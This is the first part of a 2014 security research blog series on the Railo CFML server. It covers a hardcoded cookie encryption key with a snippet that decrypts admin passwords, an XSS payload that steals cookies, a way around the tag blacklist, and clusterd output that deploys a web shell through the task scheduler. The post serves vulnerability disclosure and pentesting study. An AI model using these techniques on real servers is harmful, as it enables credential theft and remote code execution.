---
categories:
- railo
- clusterd
comments: false
date: "2014-06-25T15:00:00Z"
title: railo security - part one - intro
---

*Part one - intro*  
*[Part two - post-authentication rce](http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/)*  
*[Part three - pre-authentication lfi](http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/)*  
*[Part four - pre-authentication rce](http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/)*  

[Railo](http://getrailo.org/) is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it's own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we'll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I'll be pimping [clusterd](https://github.com/hatRiot/clusterd) throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).

I'll preface this post with a quick rundown on what we're working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on [Github](github.com/getrailo/railo); much of this post's code samples have been taken from the 4.2 branch or the master.  Hashes:

```
$ git branch
* master
$ git rev-parse master
694e8acf1a762431eab084da762a0abbe5290f49
```

And a quick rundown of the code:

```
$ cloc ./
    3689 text files.
    3571 unique files.                                          
     151 files ignored.

http://cloc.sourceforge.net v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)
---------------------------------------------------------------------------------
Language                       files          blank        comment           code
---------------------------------------------------------------------------------
Java                            2786          66639          69647         258015
ColdFusion                       315           5690           3089          35890
ColdFusion CFScript              352           4377            643          15856
XML                               22            526            563           5773
Javascript                        14             46            252            733
Ant                                4             38             70            176
DTD                                4            283            588            131
CSS                                5             52             16             77
HTML                               1              0              0              1
---------------------------------------------------------------------------------
SUM:                            3503          77651          74868         316652
---------------------------------------------------------------------------------
```

Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at `http://localhost:8888/railo-context/admin/server.cfm` and web is available at `http://localhost:8888/railo-context/admin/web.cfm`.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.

#### Authentication

As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (`web.cfm`):

```
<cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause>
        <cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#">
    <cfelse>
```

A `Remember Me For` setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user's password and stores it as the authentication cookie.  Here's the implementation of this:

```
<cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&ad],cookieKey,"CFMX_COMPAT","hex")#">
```

That's right; a static key, defined as `<cfset cookieKey="sdfsdf789sdfsd">`, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user's password client-side.  This is akin to simply base64'ing the password, as symmetric key security is dependant upon the secrecy of this shared key.

To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):

```
<cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')>
    <cfset fromCookie=true>
    <cftry>
        <cfset session["password"&ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")>
        <cfcatch></cfcatch>
    </cftry>
</cfif>
```

For example, if my stored cookie was `RAILO_ADMIN_PW_WEB=6802AABFAA87A7`, we could decrypt this with a simple CFML page:

```
<cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")>
<cfdump var="#tmp#">
```

This would dump my plaintext password (which, in this case, is "default").  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: `Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT`._

Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:

```
<cfset session["password"&request.adminType]=form["login_password"&request.adminType]>
```

In order to dump this, however, we'd need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I've placed a short CFM file on the host and set the error handler to invoke it.  `test.cfm`:

```
<cfdump var="#session#">
```

We then set the template handler to this file:

{{< figure src="/images/posts/2014/railo/railo-error-handler.jpg" >}}

If we now hit a non-existent page, `/railo-context/xx.cfm` for example, we'll trigger the cfm and get our plaintext password:

{{< figure src="/images/posts/2014/railo/railo-session-plaintext.jpg" >}}

#### XSS
XSS is now awesome, because we can fetch the server's plaintext password.  Is there XSS in Railo?

{{< figure src="/images/posts/2014/railo/railo-xss.jpg" >}}

Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.

Post-authentication search:

{{< figure src="/images/posts/2014/railo/railo-xss2.jpg" >}}

Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting `"></form><img src=x onerror=alert(document.cookie)>` will, of course, pop-up the cookie.

How about stored XSS?

{{< figure src="/images/posts/2014/railo/railo-xss3.jpg" >}}

A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.

Speaking of, let's take a quick look at the sanitization routines.  They've implemented their own routines inside of `ScriptProtect.java`, and it's a very simple blacklist:

```
  public static final String[] invalids=new String[]{
        "object", "embed", "script", "applet", "meta", "iframe"
    };
```

They iterate over these values and perform a simple compare, and if a _bad_ tag is found, they simply replace it:

```
    if(compareTagName(tagName)) {
                if(sb==null) {
                    sb=new StringBuffer();
                    last=0;
                }
                sb.append(str.substring(last,index+1));
                sb.append("invalidTag");
                last=endIndex;
            }
```

It doesn't take much to evade this filter, as I've already described.

CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there's not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:

{{< figure src="/images/posts/2014/railo/railo-server-pw.jpg" >}}

In the above image, if `Access Write` was configured to `open`, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.

#### Deploying
Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:

```
$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer task --usr-auth default

        clusterd/0.2.1 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
 [2014-05-01 10:04PM] Servers' OS hinted at windows
 [2014-05-01 10:04PM] Fingerprinting host '192.168.1.219'
 [2014-05-01 10:04PM] Server hinted at 'railo'
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server...
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator...
 [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator...
 [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
 [2014-05-01 10:04PM]   Railo Server (version 4.1)
 [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
 [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
 [2014-05-01 10:04PM] Fingerprinting completed.
 [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] > 
 [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
 [2014-05-01 10:04PM] Creating scheduled task...
 [2014-05-01 10:04PM] Task cmd.cfml created, invoking...
 [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
 [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
 [2014-05-01 10:04PM] Cleaning up...
 [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM
```

This works almost identically to the Coldfusion scheduler, and should not be surprising.

One feature Railo has that isn't found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don't need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.

Railo allows extensions to be uploaded directly to the server, found here:

{{< figure src="/images/posts/2014/railo/railo-plugin-upload.jpg" >}}

Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.  

That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.
